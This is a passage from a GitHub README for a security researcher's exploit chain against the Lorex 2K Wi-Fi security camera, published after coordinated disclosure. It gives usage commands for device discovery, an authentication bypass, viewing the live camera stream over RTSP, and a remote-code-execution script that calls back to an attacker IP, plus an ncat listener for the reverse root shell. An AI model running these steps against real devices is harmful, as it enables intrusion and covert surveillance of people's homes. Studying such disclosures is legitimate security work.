Phase 2 achieves remote code execution by leveraging the auth bypass in phase 1 to perform an authenticated stack based buffer overflow and execute an Operating System (OS) command with root privileges. This capability is then leveraged to write a file to disk and in turn, bypass the device's code signing enforcement in order to execute arbitrary native code. Finally, the exploit will execute a reverse shell payload to give the remote attacker a root shell on the target device.

## Technical Analysis

A detailed technical analysis for this exploit chain can be found in Rapid7âs whitepaper [here](https://www.rapid7.com/globalassets/_pdfs/research/pwn2own-iot-2024-lorex-2k-indoor-wi-fi-security-camera-research.pdf).

## Usage

To discover a device on the network, the `LOREX_DISCOVER.rb` script can be used. No addition parameters are required, as discovery is performed over broadcast UDP.

```
ruby LOREX_DISCOVER.rb
```

Once the IP addres of a target device has been identified, the auth bypass can be performed via the `LOREX_AUTHBYPASS.rb` script.

```
ruby LOREX_AUTHBYPASS.rb -t TARGET_IP -p Rapid7!!
```

After the auth bypass has succeeded, you can view the live video and audio stream of the target device by visiting the below URL in a suitable video player such as [VLC](https://www.videolan.org/).

```
rtsp://admin:Rapid7!!@TARGET_IP:554/cam/realmonitor?channel=1&subtype=0
```

Finally, a reverse root shell can be achieved via the `LOREX_RCE.rb` script. An IP address and port for the reverse shell to call back to must be supplied.

```
ruby LOREX_RCE.rb -t TARGET_IP -p Rapid7!! --lhost ATTACKERS_IP --lport 4444
```

Running an Ncat listner on the attackers machine will catch the reverse shell (Don't forget to open the listening port in your firewall rules).

```
ncat -lnvkp 4444
```

## Demo

### Phase 1: Auth Bypass

[![LOREX_AUTHBYPASS.demo.gif](/sfewer-r7/LorexExploit/raw/main/LOREX_AUTHBYPASS.demo.gif)](/sfewer-r7/LorexExploit/blob/main/LOREX_AUTHBYPASS.demo.gif)

### Phase 2: RCE

[![LOREX_RCE.demo.gif](/sfewer-r7/LorexExploit/raw/main/LOREX_RCE.demo.gif)](/sfewer-r7/LorexExploit/blob/main/LOREX_RCE.demo.gif)

## Credit

These vulnerabilities were discovered by Stephen Fewer, Principal Security Researcher at Rapid7 and were disclosed in accordance with Rapid7âs [vulnerability disclosure policy](https://www.rapid7.com/security/disclosure/).

## About

Lorex 2K Indoor Wi-Fi Security Camera: RCE Exploit Chain

### Resources

[Readme](#readme-ov-file)

[Activity](/sfewer-r7/LorexExploit/activity)
### Stars

[**14**
stars](/sfewer-r7/LorexExploit/stargazers)
### Watchers

[**1**
watching](/sfewer-r7/LorexExploit/watchers)
### Forks

[**4**
forks](/sfewer-r7/LorexExploit/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsfewer-r7%2FLorexExploit&report=sfewer-r7+%28user%29)

## Languages

* [Ruby
  86.6%](/sfewer-r7/LorexExploit/search?l=ruby)
* [Assembly
  13.4%](/sfewer-r7/LorexExploit/search?l=assembly)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.


